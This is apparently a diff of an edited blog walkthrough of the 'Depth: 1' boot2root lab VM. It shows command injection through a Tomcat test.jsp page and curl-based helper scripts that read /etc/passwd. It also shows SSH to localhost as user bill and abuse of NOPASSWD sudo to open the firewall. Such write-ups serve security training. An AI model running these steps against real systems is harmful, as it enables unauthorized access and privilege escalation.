@@ -20,26 +20,26 @@ This post documents the complete walkthrough of Depth: 1, a boot2root [VM][1] cr
 In Dan's own words:
 
 >Many times while conducting a pentest, I need to script something up to make my life easier or to quickly test an attack idea or vector. Recently I came across an interesting command injection vector on a web application sitting on a client's internet-facing estate. There was a page, running in Java, that allowed me to type arbitrary commands into a form, and have it execute them. While developer-provided webshells are always nice, there were a few caveats. The page was expecting directory listing style output, which was then parsed and reformatted. If the output didn't match this parsing, no output to me. Additionally, there was no egress. ICMP, and all TCP/UDP ports including DNS were blocked outbound.
- 
+
 >I was still able to leverage the command injection to compromise not just the server, but the entire infrastructure it was running on. After the dust settled, the critical report was made, and the vulnerability was closed, I thought the entire attack path was kind of fun, and decided to share how I went about it. Since I enjoy being a free man and only occasionally visit prisons, I've created a simple boot2root style VM that has a similar set of vulnerabilities to use in a walkthrough.
-  
+
 ### Information Gathering
 
-Let's kick this off with a `nmap` scan to establish the services available in the host:
+Let's kick this off with a `nmap` scan to establish the services available in the host.
 
 ```
 # nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.100.4
-...
+…
 PORT     STATE SERVICE REASON         VERSION
 8080/tcp open  http    syn-ack ttl 64 Apache Tomcat/Coyote JSP engine 1.1
-| http-methods: 
+| http-methods:
 |   Supported Methods: GET HEAD POST PUT DELETE OPTIONS
 |_  Potentially risky methods: PUT DELETE
 |_http-server-header: Apache-Coyote/1.1
 |_http-title: Apache Tomcat
 ```
 
-Only one open port?! Well, I guess I have to brute-force my way to an attack surface!
+One open port? Well, I guess I have to brute-force my way to an attack surface.
 
 ### Directory/File Enumeration
 
@@ -74,17 +74,16 @@ This is what I see when I navigated to `http://192.168.100.4:8080/test.jsp` with
 
 ![screenshot-1](/assets/images/posts/depth-walkthrough/screenshot-1.png)
 
-After some tinkering with `test.jsp` to solicit output, I observed that command execution is possible but the command output must conform to the following:
+After some tinkering with `test.jsp` to get output, I saw that command execution is possible but the command output must conform to the following:
 
 * Output must not be empty; and
-* Output must be more than 8 tokens, delimited by one or more space; and
-* Only token 2, 3, 4 and 8+ are displayed in a HTML table.
+* Output must be more than 8 tokens, delimited by one or more space.
 
-I was able to leverage on `hexdump` to act like `cat` to display `/etc/passwd` like so.
+For some reason, the HTML table shows token 2, 3, 4, and 8+. I was able to leverage `hexdump` to act like `cat` to display `/etc/passwd` like so.
 
 ![screenshot-2](/assets/images/posts/depth-walkthrough/screenshot-2.png)
 
-I wrote `cat.sh` to extract and display the printable ASCII characters.
+I wrote `cat.sh` to extract and display the printable ASCII characters from the hexadecimal numbers.
 
 {% highlight bash linenos %}
 # cat cat.sh
@@ -122,11 +121,11 @@ curl -s $_HOST:$_PORT/$_TEST?$_PATH=$CMD \
 | tr '.' '\n'
 {% endhighlight %}
 
-This is how `/etc/passwd` (only the ones of interest are shown) looked like.
+This is how `/etc/passwd` (I showed the relevant ones) looked like.
 
 ```
 # ./cat.sh /etc/passwd
-...
+…
 tomcat8:x:112:115::/usr/share/tomcat8:/bin/false
 bill:x:1000:1000:bill,,,:/home/bill:/bin/bash
 ```
@@ -139,14 +138,14 @@ Noticed that `tomcat8` has a `.ssh` directory?
 
 ![screenshot-4](/assets/images/posts/depth-walkthrough/screenshot-4.png)
 
-Noticed that `bill` is on the `sudoers` list? 
+Noticed that `bill` is on the `sudoers` list?
 
-And this is how `test.jsp` (only the JSP portion is shown) looked like.
+And this is how `test.jsp` looked like.
 
 {% highlight jsp linenos %}
 # ./cat.sh ./webapps/ROOT/test.jsp
 <%@ page import="java.util.*,java.io.*,java.util.regex.*"%>
-...
+…
 <%
     if (request.getParameter("path") != null) {
         String delims = "[ ]+";
@@ -173,7 +172,7 @@ And this is how `test.jsp` (only the JSP portion is shown) looked like.
 
                 //out.println(tokens.length);
                 //out.println(disr);
-                disr = dis.readLine(); 
+                disr = dis.readLine();
             } else {
                 disr =dis.readLine();
             }
@@ -184,7 +183,7 @@ And this is how `test.jsp` (only the JSP portion is shown) looked like.
 %>
 {% endhighlight %}
 
-Fortunately, I was able to run `ps faux` and noticed that `sshd` was running. In addition, `ufw` was also enabled as seen from `/etc/ufw/ufw.conf`.
+I was able to run `ps faux` and notice that `sshd` was running. I also saw that `ufw` was running based on what was in `/etc/ufw/ufw.conf`.
 
 ```
 # ./cat.sh /etc/ufw/ufw.conf
@@ -200,7 +199,7 @@ ENABLED=yes
 LOGLEVEL=low
 ```
 
-That explained why there was only one open port from the earlier `nmap` scan. SSH was probably blocked by the firewall.
+This explained why I saw one open port from the earlier `nmap` scan. SSH was probably blocked by the firewall.
 
 ### The Key to a Man's Heart Is Through His Stomach
 
@@ -208,7 +207,7 @@ With `cat.sh` combined with the directory listing from `test.jsp` I was able to 
 
 ![screenshot-3](/assets/images/posts/depth-walkthrough/screenshot-3.png)
 
-I took an educated guess, put two and two together and gathered that `tomcat8` probably had its public key listed in `/home/bill/.ssh/authorized_keys`. If that's the case, I should be able to login to `bill`'s account via SSH in **localhost**. Well, there's only one way to find out and as Yoda put it, "**_Do. Or do not. There is no try._**"
+I took an educated guess, put two and two together and gathered that `tomcat8` probably had its public key listed in `/home/bill/.ssh/authorized_keys`. If that's the case, I should be able to login to `bill`'s account via SSH in **localhost**. Well, let's find out and as Yoda put it, "**_Do. Or do not._**"
 
 ### Kill Bill: Vol. 1
 
@@ -216,7 +215,7 @@ I knew one can execute a command upon login via SSH. But first, let's see if I c
 
 ![screenshot-6](/assets/images/posts/depth-walkthrough/screenshot-6.png)
 
-Holy smoke! Not only was I able to execute remote commands, I was also able to overcome the output display restrictions by adding my own placeholders.
+Holy smoke. I was able to execute remote commands and overcome the output display restrictions by adding my own placeholders.
 
 With this in mind, I wrote `cmd.sh`, a script that displayed the proper output from the commands as if executed by `bill` in a shell.
 
@@ -271,7 +270,7 @@ User bill may run the following commands on b2r:
     (ALL : ALL) NOPASSWD: ALL
 ```
 
-Just as expected. Let's abuse this privilege to enable SSH in the firewall and give myself a proper shell.
+As expected, let's abuse this privilege to enable SSH in the firewall and give myself a proper shell.
 
 ```
 # ./cmd.sh "sudo ufw allow ssh"
